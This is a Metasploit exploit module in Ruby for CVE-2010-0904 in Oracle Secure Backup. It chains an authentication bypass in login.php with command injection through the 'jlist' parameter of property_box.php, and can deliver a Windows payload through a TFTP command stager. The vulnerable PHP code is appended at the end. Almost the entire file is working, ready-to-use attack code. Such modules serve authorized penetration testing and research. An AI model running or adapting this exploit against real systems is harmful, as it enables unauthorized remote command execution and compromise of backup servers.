# $Id: osb_uname_jlist.rb 13591 2011-08-19 18:35:29Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an authentication bypass vulnerability
                in login.php. In conjuction with the authentication bypass issue,
                the &#039;jlist&#039; parameter in property_box.php can be used to execute
                arbitrary system commands.
                This module was tested against Oracle Secure Backup version 10.3.0.1.0
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13591 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-118&#039; ],
                    [ &#039;CVE&#039;, &#039;2010-0904&#039; ],
                    # the jlist vector has not been disclosed or has it?
                ],
            &#039;Targets&#039;   =>
                [
                    [ &#039;Windows Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;
                        }
                    ]
                ],
            &#039;Privileged&#039; => &#039;true&#039;,
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;DisclosureDate&#039; => &#039;Jul 13 2010&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
            [
                Opt::RPORT(443),
                OptBool.new(&#039;SSL&#039;,   [true, &#039;Use SSL&#039;, true]),
                OptString.new(&#039;CMD&#039;, [ false, &#039;Execute this command instead of using command stager&#039;, "" ])
            ], self.class)
    end
 
    def windows_stager
 
        exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"
         
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        execute_cmdstager({ :temp => &#039;.&#039;})
        @payload_exe = payload_exe
         
        print_status("Attempting to execute the payload...")
        execute_command(@payload_exe)
     
    end
 
    def execute_command(cmd, opts = {})
 
        res = send_request_cgi(
            {
                &#039;uri&#039;   =>  &#039;/login.php&#039;,
                &#039;data&#039;  =>  &#039;attempt=1&uname=-&#039;,
                &#039;method&#039; => &#039;POST&#039;,
            }, 5)
 
        if (res.headers[&#039;Set-Cookie&#039;] and res.headers[&#039;Set-Cookie&#039;].match(/PHPSESSID=(.*);(.*)/i))
            sessionid = res.headers[&#039;Set-Cookie&#039;].split(&#039;;&#039;)[0]
 
            data = &#039;?type=Job&jlist=0%26&#039; + Rex::Text::uri_encode(cmd)
         
            send_request_raw(
                {
                    &#039;uri&#039;   => &#039;/property_box.php&#039; + data,
                    &#039;cookie&#039; => sessionid,
                    &#039;method&#039; => &#039;GET&#039;,
                }, 5)
 
        else
            print_error("Invalid PHPSESSION token..")
            return
        end
    end
 
    def exploit
 
        if not datastore[&#039;CMD&#039;].empty?
            print_status("Executing command &#039;#{datastore[&#039;CMD&#039;]}&#039;")
            execute_command(datastore[&#039;CMD&#039;])
            return
        end
 
        case target[&#039;Platform&#039;]
            when &#039;win&#039;
                windows_stager
            else
                raise RuntimeError, &#039;Target not supported.&#039;
        end
 
        handler
     
    end
end
__END__
  else if (strcmp($type, "Job") == 0)
    {
    if (!is_array($objectname))
      $objectname = array();
    reset($objectname);
    while (list(,$oname) = each($objectname))
      {
      $oname = escapeshellarg($oname);
      $jlist = "$jlist $oname";
      }
    if (strlen($jlist) > 0)
      $msg = exec_qr("$rbtool lsjob -lrRLC $jlist");



